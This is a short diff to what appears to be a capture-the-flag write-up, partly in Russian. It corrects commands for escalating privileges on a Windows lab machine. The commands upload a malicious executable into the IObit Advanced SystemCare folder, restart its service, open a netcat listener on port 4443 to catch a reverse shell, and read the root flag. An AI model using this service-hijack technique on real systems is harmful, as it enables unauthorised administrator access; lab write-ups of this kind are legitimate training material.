@@ -82,7 +82,7 @@ xe
 ```
 
 ```
- upload /home/leandoero/hack4tech/Advanced.exe "C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\"
+upload /home/leandoero/hack4tech/Advanced.exe "C:\\Program Files (x86)\\IObit\\"
 ```
 
 ```
@@ -91,7 +91,7 @@ net stop AdvancedSystemCareService9
 
 #### На своей машине слушаю порт:
 ```
-nc -lnvp nc -lnvp 4443
+nc -lnvp 4443
 ```
 
 ```
@@ -101,4 +101,5 @@ net start AdvancedSystemCareService9
 #### Path: C:\Users\Administrator\Desktop\root.txt
 
 Finally we got flag2
+
 
